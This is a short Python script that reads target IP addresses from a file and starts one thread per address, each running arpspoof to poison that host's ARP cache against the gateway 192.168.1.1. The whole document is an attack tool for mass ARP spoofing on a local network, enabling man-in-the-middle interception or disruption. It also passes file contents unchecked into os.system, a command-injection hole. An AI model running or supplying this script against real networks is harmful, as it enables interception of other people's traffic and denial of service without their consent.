import os
import time
import threading
file=open("a.txt")
ipx=file.readlines()
def my(x):
    exp="arpspoof -i eth0 -t "+str(ipx[x].replace("\n",""))+" 192.168.1.1"
    os.system(exp)
for i in range(len(ipx)):
    time.sleep(1)
    ok=[i]
    kaishi=threading.Thread(target=my,args=ok)
    kaishi.start()
